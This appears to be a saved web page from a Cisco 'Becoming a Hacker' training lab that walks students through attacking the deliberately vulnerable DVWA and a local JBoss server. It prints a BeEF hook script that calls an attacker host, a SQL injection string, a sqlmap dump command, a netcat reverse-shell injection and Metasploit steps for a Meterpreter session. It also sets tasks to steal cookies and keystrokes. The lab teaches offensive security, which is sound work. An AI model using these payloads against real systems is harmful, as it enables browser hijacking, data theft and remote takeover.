<!DOCTYPE html>
<!-- saved from url=(0042)http://opflex.ciscolive.com/pod1/basics/os -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="cache-control" content="max-age=0">
            <meta http-equiv="cache-control" content="no-cache">
            <meta http-equiv="expires" content="0">
            <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
            <meta http-equiv="pragma" content="no-cache">
            <link href="./os_files/bootstrap.min.css" rel="stylesheet" media="screen">
            <link href="./os_files/github.css" rel="stylesheet">
            <link href="./os_files/cerulean.css" rel="stylesheet">
            <link href="./os_files/whitebackgroundmenu.css" rel="stylesheet">
            <link rel="stylesheet" href="./os_files/font-awesome.min.css">
            <link href="./os_files/style.css" rel="stylesheet">
            <link href="./os_files/cssterm.css" rel="stylesheet">
            <link href="./os_files/bootstrap-select.min.css" rel="stylesheet">

            <title>BAH Module 6</title>
             <meta name="author" content="Omar Santos">

</head>
<body>


	<div class="container">
		<nav class="navbar navbar-default navbar-fixed-top" id="ltraci-navbar" role="navigation">
		  <div class="container-fluid">
		    <!-- Brand and toggle get grouped for better mobile display -->
		    <div class="navbar-header">

			        <a href="index.html" class="navbar-brand"><div class="pn-noncollapse">Becoming a Hacker</div></a>

		      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
		        <span class="sr-only">Toggle navigation</span>
		        <span class="icon-bar navbar-inverse"></span>
		        <span class="icon-bar"></span>
		        <span class="icon-bar"></span>
		      </button>
		    </div>
		    <!-- Collect the nav links, forms, and other content for toggling -->
		    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
		      <ul class="nav navbar-nav">


		        <li class="dropdown">
		          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Menu<span class="caret"></span></a>
		          <ul class="dropdown-menu multi-column columns-3" role="menu" style="font-size:.7em;">
			          <div class="row">
				          <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 1</li>
										  <li>
                       <a href="#">No labs</a>
                      </li>
                    </ul>
				          </div>

                  <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 2</li>
										  <li>
                       <a href="module2.html">Passive Reconnissaince</a>
                      </li>
                    </ul>
				          </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 3</li>
                      <li>
                       <a href="module3.html">Active Reconnissaince</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 4</li>
                      <li>
                       <a href="module4.html">Networking</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 5</li>
                      <li>
                       <a href="module5.html">Wireless</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 6</li>
                      <li>
                       <a href="module6.html">Web Applications</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 7</li>
                      <li>
                       <a href="module7.html">Accounts and Passwords</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 8</li>
										  <li>
                       <a href="module8.html">Overflows</a>
                      </li>
                    </ul>
				          </div>


               </div>
               </ul>
               </li>



				<li class="ciscoliveitem"><a target="blank" href="resources.html">Resources</a></li>
				<li class="ciscoliveitem"><a target="blank" data-toggle="modal" data-target="#ABOUT" href="#">About</a></li>

		      </ul>

		    </div><!-- /.navbar-collapse  width="30px" -->
		  </div><!-- /.container-fluid -->
		</nav>
		</div>


    <div class="modal fade" id="ABOUT" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
            <h3 class="modal-title" id="myModalLabel">Becoming a Hacker Training</h3>
          </div>
          <div class="modal-body">
    		<div class="row">
                <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
                    <img src="./os_files/hacker.png" class="img-responsive">
                </div>
                <div class="col-lg-8 col-md-8 col-sm-6 col-xs-12">
                    <p>
                        The purpose of this lab is to provide the student a better understanding of offensive security.
                    </p>
                    <p>
                        Navigate to the <a href="resources.html"> Resources </a> page to obtain the presentations used in this class, as well as other resources on how to build your own lab.
                    </p>
                </div>
            </div>
            <div class="row">
              <p>

              </p>
            </div>
    		<div class="row" style="margin-top:20px;">
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Chris McCoy</strong><br>
                    Hacker, ASIG<br>
    				cmm@cisco.com<br>
    			</div>
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Everett Stiles</strong><br>
                    Hacker, ASIG<br>
    				estiles@cisco.com<br>
    			</div>
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Omar Ωr Santos</strong><br>
                    Peasant, PSIRT<br>
    				os@cisco.com<br>
    			</div>
    		</div>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>



<div class="container">
<h1>Hacking Web Applications</h1>

<h3> Goals </h3>

<ul>
<li>
<p class="line862">Successfully exploit the&nbsp;<a class="http" href="http://www.dvwa.co.uk/">Damn Vulnerable Web App (DVWA)</a>&nbsp;with&nbsp;<a class="https" href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)">Cross-Site Scripting (XSS)</a><span id="line-9" class="anchor"></span></p>
</li>
<li>
<p class="line862">Leverage this XSS and take control of a users' browser with the&nbsp;<a class="http" href="http://beefproject.com/">Browser Exploitation Framework (BeEF)</a><span id="line-10" class="anchor"></span></p>
</li>
<li>
<p class="line862">Successfully exploit an&nbsp;<a class="https" href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">SQL Injection</a>&nbsp;in the DVWA to enumerate users on the app<span id="line-11" class="anchor"></span></p>
</li>
<li>
<p class="line862">Use&nbsp;<a class="http" href="http://sqlmap.org/">SQLMap</a>&nbsp;to assist in the exploitation and exfiltration of SQL Injection errors.<span id="line-12" class="anchor"></span></p>
</li>
<li>
<p class="line862">Practice exploiting an&nbsp;<a class="https" href="https://www.owasp.org/index.php/Command_Injection">OS command injection</a>&nbsp;vulnerability to create a&nbsp;<a class="http" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a><span id="line-13" class="anchor"></span></p>
</li>
<li>
<p class="line862">Use the&nbsp;<a class="https" href="https://community.rapid7.com/community/metasploit">Metasploit Framework</a>&nbsp;to assess a JBoss install for vulnerabilities, then exploit JBoss using the Meterpreter plugin</p>
</li>
</ul>


<h2>Exercise 1: Prerequisites</h2>

<h3>Task 1</h3>
Start BurpSuite.

<ul>
<li>This can be found in Applications <strong>Menu &gt; 03 - Web Application Analysis</strong></li>
<li>Choose Temporary project, Click <strong>Next</strong></li>
<li>Choose Use Burp defaults, Click <strong>Start Burp</strong></li>
<li>Click on the <strong>Proxy tab</strong>, then <strong>Intercept</strong></li>
<li>Make sure Intercept is <strong>Off</strong>.</li>
</ul>

<hr>
<h3>Task 2</h3>
Set Firefox to use BurpSuite as a proxy and disable captive portal detection

<ul>
<li>Using Firefox on Kali, browse to <strong>about:config</strong>.</li>
<li>Choose<strong> I Accept the Risk</strong>. Search for captive. Set network.captive-portal-service.enabled to false.</li>
<li>Proxy settings can be found in O<strong>pen Menu &rarr; Preferences &rarr; Advanced &rarr; Network &rarr;&nbsp;</strong><strong>Configure how Firefox connects to the Internet &rarr; Settings</strong>...</li>
<li>Select Manual proxy configuration and make sure HTTP Proxy is set to <strong>localhost</strong> and port <strong>8080</strong></li>
<li>Using Firefox, browse to <a href="http://metasploitable/dvwa">http://metasploitable/dvwa</a> .</li>
<li>You should see the request show up in BurpSuite under <strong>HTTP History</strong></li>
<li>What version of Apache is the server running?</li>
</ul>


<hr>
<h3>Task 3</h3>
Log in as <em><b>smithy</b></em> / <em><b>password</b></em>

<hr>
<h3>Task 4</h3>
The security level is displayed at the bottom of the page

<ul>
<li>
<p>Change the Security Level of DVWA to <strong>Low</strong>. This can be found in <em><strong>DVWA Security</strong></em>.</p>
</li>
<li>
<p>You'll need to do this if you log out and log back in, or log in from another host<br /><br /></p>
</li>
</ul>


<hr>
<h3>Task 5</h3>
Start the beef-xss service:
<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>BeeF</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 1 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button></div>
<div class="ciscohl2" id="copy-1" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
service beef-xss start
</pre>
</div></div>
<!-- end of copy /paste block -->



<hr>
<h3>Task 6</h3>
<p>Make sure you can reach the BeEF UI authentication page at <a href="http://localhost:3000/ui/authentication">http://localhost:3000/ui/authentication</a>&nbsp;</p>

<blockquote> Note: By default, requests to localhost will not be sent to BurpSuite with the default proxy settings. </blockquote>

<p>Log in as <em><strong>beef</strong></em> / <strong><em>beef</em></strong> .</p>


<h2>Exercise 2 : Cross Site Scripting</h2>
<h3>Task 1</h3>
<ul>
<li>In a new tab, navigate to <strong>XSS Reflected</strong>. You can view the PHP source code by clicking the <strong>View Source</strong> button at the bottom of the page.</li>
<li>Try placing your name in the <strong>Textbox</strong> and click <strong>Submit</strong></li>
<li>From looking at <strong>BurpSuite</strong>, how was your name sent to the server?</li>
<li>Trigger a reflected <strong>XSS alert</strong> and print out the current document cookie</li>
<li>Use the Web Developer Tools to help you navigate the DOM (<strong>Tools &rarr; Web Developer &rarr; Inspector</strong>)</li>
<li>You can also use the Web Console to view a value in the DOM</li>
</ul>

<h3>Task 2</h3>
Navigate to XSS Stored. Figure out a way to insert a BeEF Hook.  You can paste in your web browser using <b>[Control+V]</b>:

<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>XSS Stored</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 2 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-2">Copy</button></div>
<div class="ciscohl2" id="copy-2" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
&lt;script src="http://192.168.1.2:3000/hook.js" type="text/javascript"&gt;&lt;/script&gt;
</pre>
</div></div>
<!-- end of copy /paste block -->

<blockquote>Note: Use the developer tools to modify the maxlength attribute in the textarea tag, or use BurpSuite to intercept and modify the POST message parameters.</blockquote>



<h3>Task 3</h3>
<p>Open your Windows desktop and use Firefox to go to DVWA, log in as&nbsp;admin&nbsp;/&nbsp;password</p>
<ul>
<li>Go to XSS Stored</li>
<li>From the BeEF UI, see if the Windows browser is hooked. If not, figure out why not</li>
</ul>

<hr><br>
<h3>Task 4</h3>
<p>Type your name and a message from Windows in the message and store it</p>
<ul>
<li>What version of Firefox is running on the hooked Windows Browser?</li>
<li>What is the size of the screen?</li>
<li>See if you can see the characters that were entered in Windows from the Beef UI. You may need to refresh the log<span id="line-66"></span></li>
<li>Create a prompt dialog with the message of your choice. (Commands &rarr; Browser &rarr; Hooked Domain)</li>
<li>Finally, get the hooked browser's cookie.</li>
</ul>

<p><strong>Bonus</strong>:&nbsp;Use the stolen cookie to access the DVWA as admin.</p>

<hr><br>
<h3>Task 5</h3>
<p>To keep BeEF from interfering with later labs, release all hooked browsers</p>
<ul>
<li>Reset the DVWA RDMS Database from Setup</li>
<li>Log back in as admin</li>
<li>Close the Remote Desktop for <tt>windows</tt></li>
</ul>

<hr>
<h2>Exercise 3 : SQL Injection</h2>
<h3>Task 1</h3>
<p>Navigate to <strong>SQL Injection</strong>. Enumerate users on the system with an SQL injection.</p>


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat1" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
a' or 'a' = 'a
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<!--end hint -->


<hr>
<h3>Task 2</h3>

<p>Use SQLMap to dump the database</p>
<ul>
<li>You'll need to copy your cookie from the browser</li>
<li>What RDMS is the target using?</li>
<li>Skip test payloads for other RDMSes</li>
<li>Which parameter is injectable?</li>
<li>What is Pablo Picasso's password?</li>
</ul>



<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>SQLMap</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 3 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-3">Copy</button></div>
<div class="ciscohl2" id="copy-3" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
sqlmap --cookie="&lt;cookie&gt;" --url="http://metasploitable/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --string="surname" --dump
</pre>
</div></div>
<!-- end of copy /paste block -->

<hr>
<h2>Exercise 4 : Command Injection</h2>
<h3>Task 1</h3>

<p>Navigate to&nbsp;<strong>Command Execution</strong>. Inject the command&nbsp;<tt>id</tt></p>
<ul>
<li><strong>&lt;star-wars-reference&gt; Use the source Luke! &lt;/star-wars-reference&gt;</strong></li>
<li><strong>nano-Hint</strong>: If ping returns an error, you won't see anything.</li>
<li>What user is PHP running as?</li>
</ul>

<hr>
<h3>Task 2</h3>
<p>Spawn a&nbsp;<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a>&nbsp;using Netcat.</p>

<hr>
<h3>Task 2a</h3>
Start a listener using netcat from Kali:


<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Create a listener</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 4 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-4">Copy</button></div>
<div class="ciscohl2" id="copy-4" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
nc -v -l -p 4444
</pre>
</div></div>
<!-- end of copy /paste block -->

<hr>
<h3>Task 2b</h3>

<p>Inject this command: <tt>localhost&nbsp;&amp;&amp;&nbsp;nc&nbsp;-e&nbsp;/bin/bash&nbsp;kali&nbsp;4444</tt></p>
<ul>
<li>This will start netcat on the remote host and connect back to you with a shell</li>
<li>It's normal not to have a prompt -- type commands as you normally would anyway</li>
</ul>

<hr>
<h3>Task 3</h3>
What is the uptime of the system?

<hr><br>
<h2>Exercise 5 : Intro to Exploits Using Metasploit Against JBoss</h2>
<h3>Task 1</h3>
<p><strong>Shut down BurpSuite</strong>. It uses port 8080 which will conflict with JBoss</p>
<ul>
<li>You may also need to reboot:&nbsp;<tt>reboot</tt></li>
</ul>

<hr>
<h3>Task 2</h3>
Run JBoss:
<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Run JBoss</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 5 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-5">Copy</button></div>
<div class="ciscohl2" id="copy-5" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
  cd ~/labs/web-apps
</pre>
<pre>
  ./run-jboss.sh
</pre>
</div></div>
<!-- end of copy /paste block -->


<hr>
<h3>Task 3</h3>

<p>Using Firefox, check that you can connect to JBoss at <a href="http://localhost:8080/">http://localhost:8080</a></p>

<hr>
<h3>Task 4</h3>
<p>Using Metasploit, run the&nbsp;<strong>jboss_vulnscan</strong>&nbsp;plugin:</p>


<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Use the auxiliary/scanner/http/jboss_vulnscan module </div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 6 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-6">Copy</button></div>
<div class="ciscohl2" id="copy-6" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
  use auxiliary/scanner/http/jboss_vulnscan
</pre>
</div></div>
<!-- end of copy /paste block -->

<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Use info to obtain more information about the module</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 7 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-7">Copy</button></div>
<div class="ciscohl2" id="copy-7" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
  info
</pre>
</div></div>
<!-- end of copy /paste block -->

<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Set the Remote Host (RHOST)</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 8 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-8">Copy</button></div>
<div class="ciscohl2" id="copy-8" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
set RHOSTS 127.0.0.1
</pre>
</div></div>
<!-- end of copy /paste block -->

<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Set the Remote Port (RPORT)</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 9 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-9">Copy</button></div>
<div class="ciscohl2" id="copy-9" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
set RPORT 8080
</pre>
</div></div>
<!-- end of copy /paste block -->

<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Start the exploit</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 10 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-10">Copy</button></div>
<div class="ciscohl2" id="copy-10" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
exploit
</pre>
</div></div>
<!-- end of copy /paste block -->


<hr>
<h3>Task 5</h3>
Run Meterpreter through the jboss_invoke_deploy exploit:


<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Similar procedure as the one you just learned, but in this case invoking Meterpreter.</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 11 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-11">Copy</button></div>
<div class="ciscohl2" id="copy-11" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
use exploit/multi/http/jboss_invoke_deploy
</pre><pre>
info
</pre><pre>
set RHOST 127.0.0.1
</pre><pre>
set RPORT 8080
</pre><pre>
set LHOST 127.0.0.1
</pre><pre>
set LPORT 5555
</pre><pre>
exploit -t 1
</pre>
</div></div>
<!-- end of copy /paste block -->


<hr>
<h3>Task 6</h3>
List the running processes on the victim.
<ul>
<li>
Use <tt>help</tt>
</li>
<li>What other commands look interesting? Try some of them out!</li>
</ul>

<div class="nextsection">
    <div style="float:left; font-size: .9em;">

    </div>
    <div style="float:right; font-size: .9em;">

            <div class="btn-group">
                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;module7.html&#39;">Next: Module 7</button>
                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;module7.html&#39;">
                        <span class="glyphicon glyphicon-chevron-right" style="color:white;" aria-hidden="true"></span>
                </button>
            </div>

    </div>
</div>

</div><!-- Whole page container -->

			<!-- </div> -->
    	<!--- </div> -->
        <span style="font-size:.7em; color:0x696969; float:right;margin:30px 20px 0px 0px;">© Copyright Cisco Systems</span>



<script src="./os_files/jquery.min.js"></script>
<script src="./os_files/bootstrap.min.js"></script>
<!-- <script src="/static/js/ZeroClipboard.js" type="text/javascript"></script> -->
<script src="./os_files/highlight.pack.js"></script>
<script type="text/javascript" src="./os_files/sijax.js"></script>
<script type="text/javascript" src="./os_files/cssterm.js"></script>
<script type="text/javascript" src="./os_files/clipboard.min.js"></script>
<script type="text/javascript" src="./os_files/bootstrap-select.min.js"></script>
<script type="text/javascript">
    Sijax.setRequestUri("/pod1/basics/os");Sijax.setJsonUri("/static/js/sijax/json2.js");
</script>


<script type="text/javascript">
var urlParams;
(window.onpopstate = function () {
    var match,
        pl     = /\+/g,  // Regex for replacing addition symbol with a space
        search = /([^&=]+)=?([^&]*)/g,
        decode = function (s) { return decodeURIComponent(s.replace(pl, " ")); },
        query  = window.location.search.substring(1);

    urlParams = {};
    while (match = search.exec(query))
       urlParams[decode(match[1])] = decode(match[2]);
})();

// Config ZeroClipboard
//ZeroClipboard.config({
//    hoverClass: 'btn-clipboard-hover'
//})

// Insert copy to clipboard button before .ciscohl
//$('.ciscohl').each(function () {
//    var btnHtml = '<div class="zero-clipboard"><span class="btn-clipboard">Copy</span></div>';
//    $(this).before(btnHtml)
//});

function runit(codeid){
    var codeblock = "codeblock-" + codeid;
    var preblock =  "output-" + codeid;
    var outfixhtmlfunc = 'outputfixhtml' + codeid;
    var code = document.getElementById(codeblock).value;
	document.getElementById(preblock).innerHTML = '';
    Sk.configure({output:eval(outfixhtmlfunc) });
    eval(Sk.importMainWithBody("<stdin>", false, code));
}





//var zeroClipboard = new ZeroClipboard($('.btn-clipboard'));
//var htmlBridge = $('#global-zeroclipboard-html-bridge');
//
//// Handlers for ZeroClipboard
//zeroClipboard.on('ready', function (event) {
//    htmlBridge
//        .data('placement', 'top')
//        .attr('title', 'Copy to clipboard')
//        .tooltip();
//    var ciscohl = $(event.target).parent().nextAll('.ciscohl').first();
//    console.log(ciscohl);
//
//    // Copy to clipboard
//    zeroClipboard.on('copy', function (event) {
//        var ciscohl = $(event.target).parent().nextAll('.ciscohl').first();
//        console.log ( ciscohl[0].id );
//        var pod = urlParams["pod"];
//        var section = urlParams["section"];
//
//        $.ajax({
//	       //type: "GET",
//	       url: "/dash/collect/pod/1/basics/os/" + ciscohl[0].id
//	       // data:  "pod=" + pod + "&section=" + section + "&step=" + ciscohl[0].id
//        });
//        event.clipboardData.setData("text/plain", ciscohl.text());
//         // $(event.target).parent().next(".ciscohl").css("background","#e0ffcb url('/static/images/ok.png') no-repeat top left / 45px 45px")
//         $(event.target).parent().next(".ciscohl").css("background","#e0ffcb url('/static/images/ok.png') no-repeat bottom right / 45px 45px")
//    });
//
//    // Notify copy success and reset tooltip title
//    zeroClipboard.on('aftercopy', function () {
//        htmlBridge
//            .attr('title', 'Copied!')
//            .tooltip('fixTitle')
//            .tooltip('show')
//            .attr('title', 'Copy to clipboard')
//            .tooltip('fixTitle');
//
//    });
//});
//
//function findPos(obj) {
//    var curtop = 0;
//    if (obj.offsetParent) {
//        do {
//            curtop += obj.offsetTop;
//        } while (obj = obj.offsetParent);
//    return [curtop];
//    }
//}
//
//
//// Notify copy failure
//zeroClipboard.on('error', function () {
//    ZeroClipboard.destroy();
//    htmlBridge
//        .attr('title', 'Flash required')
//        .tooltip('fixTitle')
//        .tooltip('show');
//});
//

///////////////////////////////////////////////////////////////////////////////
// Start NEW COPY/PASTE Clipboard code.
///////////////////////////////////////////////////////////////////////////////

var clipboard = new Clipboard('.copybutton', {
    text: function(btn_object){
        var webcopy = $(btn_object).parent().nextAll('.ciscohl2').first();
        return webcopy[0].innerText + "\n\r";
    }
});
clipboard.on('success', function(e) {
    var webcopy = $(event.target).parent().nextAll('.ciscohl2').first();
    var pod = urlParams["pod"];
    var section = urlParams["section"];

    $.ajax({
        url: "/dash/collect/pod/1/basics/os/" + webcopy[0].id
    });
    $(event.target).parent().next(".ciscohl2").css("background","#e0ffcb url('/static/images/ok.png') no-repeat bottom right / 45px 45px")

    e.clearSelection();
});
///////////////////////////////////////////////////////////////////////////////
// End COPY/PASTE Clipboard code.
///////////////////////////////////////////////////////////////////////////////



$(document).ready(function(){
   // cache the window object
   $window = $(window);

    $('.selectpicker').selectpicker({
          style: 'btn-default',
          size: 12
      });






    // $('pre code').each(function(i, block) {
    //     hljs.highlightBlock(block);
    // });

   $('section[data-type="background"]').each(function(){
     // declare the variable to affect the defined data-type
     var $scroll = $(this);

      $(window).scroll(function() {
        // HTML5 proves useful for helping with creating JS functions!
        // also, negative value because we're scrolling upwards
        var yPos = -($window.scrollTop() / $scroll.data('speed'));

        // background position
        var coords = '50% '+ yPos + 'px';

        // move the background
        $scroll.css({ backgroundPosition: coords });
      }); // end window scroll
   });  // end section function
}); // close out script


</script>

<textarea readonly="" style="font-size: 12pt; border: 0px; padding: 0px; margin: 0px; position: absolute; left: -9999px; top: 0px;"></textarea></body></html>
